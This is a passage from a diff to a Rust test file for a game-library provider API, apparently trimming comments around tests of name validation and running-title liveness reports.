     let (s, _) = send(
         &app,
         put(
@@ -3194,7 +2945,6 @@ async fn provider_reconcile_validation() {
     assert_eq!(s, StatusCode::BAD_REQUEST);
     assert!(json["error"].as_str().unwrap().contains("duplicate"));
 
-    // DELETE validates the name too.
     let del = axum::http::Request::delete("/api/v1/library/provider/manual")
         .body(Body::empty())
         .unwrap();
@@ -3202,15 +2952,9 @@ async fn provider_reconcile_validation() {
     assert_eq!(s, StatusCode::BAD_REQUEST);
 }
 
-/// Liveness reporting: the provider id is validated like every other provider write, and a title
-/// the provider does not publish is *counted*, not refused.
-///
-/// That tolerance is the point. A report races its own reconcile by construction — a game can start
-/// before the entry that describes it has landed — and 400-ing the whole report over one unknown id
-/// would throw away the liveness of every other running title, which is precisely the failure the
-/// launcher-tile 400 taught us to avoid (`sanitize_launcher_entries`). The developer's real catalog
-/// is not touched here, so every id in this test is `unknown` by construction — which is exactly
-/// the case being pinned.
+/// Unknown titles are counted, not refused: a report races its own reconcile, and 400-ing
+/// the whole report would drop every other running title. Catalog is untouched, so every
+/// id here is unknown by construction.
 #[tokio::test]
 async fn provider_running_report_validation() {
     let app = test_app(test_state(), None);
@@ -3227,14 +2971,13 @@ async fn provider_running_report_validation() {
     let (s, _) = send(&app, put("Bad%2FName", serde_json::json!({"running": []}))).await;
     assert_eq!(s, StatusCode::BAD_REQUEST);
 
-    // An unreported provider is a legitimate report of "nothing is running".
+    // Unreported provider: a legitimate "nothing is running".
     let (s, json) = send(&app, put("playnite", serde_json::json!({"running": []}))).await;
     assert_eq!(s, StatusCode::OK);
     assert_eq!(json["matched"], 0);
     assert_eq!(json["unknown"], 0);
     assert!(json["ttl_s"].as_u64().unwrap() > 0);
 
-    // An id this provider does not publish is ignored, not an error.
     let (s, json) = send(
         &app,
         put(
@@ -3247,8 +2990,7 @@ async fn provider_running_report_validation() {
     assert_eq!(json["matched"], 0);
     assert_eq!(json["unknown"], 1);
 
-    // A report leaves no opinion behind about a title nobody published, so nothing this test did
-    // can hold a real lease open.
+    // A report of unpublished titles must not hold a real lease open.
     assert!(!crate::runstate::speaks_for(Some("playnite:no-such-title")));
     crate::runstate::forget("playnite");
 }
